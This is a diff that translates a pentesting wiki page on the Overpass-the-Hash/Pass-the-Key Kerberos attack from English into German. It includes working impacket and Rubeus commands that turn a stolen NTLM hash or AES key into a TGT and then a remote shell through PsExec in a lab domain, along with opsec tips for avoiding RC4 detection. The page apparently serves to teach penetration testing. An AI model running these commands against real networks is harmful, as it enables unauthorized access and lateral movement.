@@ -8,38 +8,32 @@
 
 ## Overpass The Hash/Pass The Key (PTK)
 
-The **Overpass The Hash/Pass The Key (PTK)** attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.
+Der **Overpass The Hash/Pass The Key (PTK)** Angriff ist für Umgebungen konzipiert, in denen das traditionelle NTLM-Protokoll eingeschränkt ist und die Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder die AES-Schlüssel eines Benutzers, um Kerberos-Tickets anzufordern, was unbefugten Zugriff auf Ressourcen innerhalb eines Netzwerks ermöglicht.
 
-To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.
+Um diesen Angriff auszuführen, besteht der erste Schritt darin, den NTLM-Hash oder das Passwort des Zielbenutzerkontos zu erlangen. Nach dem Sichern dieser Informationen kann ein Ticket Granting Ticket (TGT) für das Konto erhalten werden, was dem Angreifer den Zugriff auf Dienste oder Maschinen ermöglicht, für die der Benutzer Berechtigungen hat.
 
-The process can be initiated with the following commands:
-
+Der Prozess kann mit den folgenden Befehlen initiiert werden:
 ```bash
 python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
+Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES key]` verwendet werden. Darüber hinaus kann das erworbene Ticket mit verschiedenen Tools wie smbexec.py oder wmiexec.py verwendet werden, was den Umfang des Angriffs erweitert.
 
-For scenarios necessitating AES256, the `-aesKey [AES key]` option can be utilized. Moreover, the acquired ticket might be employed with various tools, including smbexec.py or wmiexec.py, broadening the scope of the attack.
+Aufgetretene Probleme wie _PyAsn1Error_ oder _KDC kann den Namen nicht finden_ werden typischerweise durch ein Update der Impacket-Bibliothek oder durch die Verwendung des Hostnamens anstelle der IP-Adresse gelöst, um die Kompatibilität mit dem Kerberos KDC sicherzustellen.
 
-Encountered issues such as _PyAsn1Error_ or _KDC cannot find the name_ are typically resolved by updating the Impacket library or using the hostname instead of the IP address, ensuring compatibility with the Kerberos KDC.
-
-An alternative command sequence using Rubeus.exe demonstrates another facet of this technique:
-
+Eine alternative Befehlssequenz mit Rubeus.exe zeigt eine weitere Facette dieser Technik:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
+Diese Methode spiegelt den **Pass the Key**-Ansatz wider, mit dem Fokus auf die Übernahme und direkte Nutzung des Tickets zu Authentifizierungszwecken. Es ist wichtig zu beachten, dass die Initiierung einer TGT-Anfrage das Ereignis `4768: Ein Kerberos-Authentifizierungsticket (TGT) wurde angefordert` auslöst, was standardmäßig die Verwendung von RC4-HMAC bedeutet, obwohl moderne Windows-Systeme AES256 bevorzugen.
 
-This method mirrors the **Pass the Key** approach, with a focus on commandeering and utilizing the ticket directly for authentication purposes. It's crucial to note that the initiation of a TGT request triggers event `4768: A Kerberos authentication ticket (TGT) was requested`, signifying an RC4-HMAC usage by default, though modern Windows systems prefer AES256.
-
-To conform to operational security and use AES256, the following command can be applied:
-
+Um die operationale Sicherheit zu gewährleisten und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-
-## References
+## Referenzen
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
@@ -48,4 +42,3 @@ To conform to operational security and use AES256, the following command can be 
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
